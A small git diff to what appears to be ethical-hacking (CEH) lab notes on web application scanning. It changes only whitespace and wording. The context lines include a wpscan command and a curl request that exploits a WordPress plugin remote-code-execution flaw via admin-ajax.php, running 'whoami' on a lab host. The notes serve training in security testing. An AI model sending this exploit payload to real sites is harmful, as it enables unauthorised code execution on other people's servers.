@@ -1907,6 +1907,7 @@ also sgpt --shell "Mirror the target website https://certifiedhacker.com with ht
 
  <details>
  <summary> Perform Web Application Vulnerability Scanning using SmartScanner </summary>
+ 
  ```console
 :~$windows 11
 on the Desktop. Search smartscanner in the search field, 
@@ -1964,7 +1965,7 @@ copy the api token
 * open parrot security machine and super user and cd
 *In the Terminal window, run wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token from Step#13] command.
 as we identified RCE (remote code execution) now we are exploiting it
-* To perform RCE attack, run curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' command.
+* To perform RCE attack, run curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' .
 ```
 </details>
 <details>
